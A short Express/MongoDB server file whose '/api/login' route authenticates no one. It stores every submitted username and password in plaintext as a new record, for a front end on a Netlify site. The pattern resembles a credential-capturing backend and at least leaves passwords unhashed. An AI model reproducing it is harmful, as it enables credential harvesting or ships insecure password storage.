const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const User = require("./models/User");

const app = express();

app.use(cors({ origin: "https://quicksign3.netlify.app", credentials: true }));
app.use(express.json());

// Connect MongoDB
mongoose.connect("YOUR_MONGODB_ATLAS_URI")
  .then(() => console.log("DB connected"))
  .catch(err => console.log(err));

// POST route to save login data
app.post("/api/login", async (req, res) => {
  const { username, password } = req.body;
  try {
    const newUser = new User({ username, password });
    await newUser.save();
    res.status(200).json({ message: "User saved successfully" });
  } catch (err) {
    res.status(500).json({ error: "Error saving user" });
  }
});

app.listen(5000, () => console.log("Server running on port 5000"));
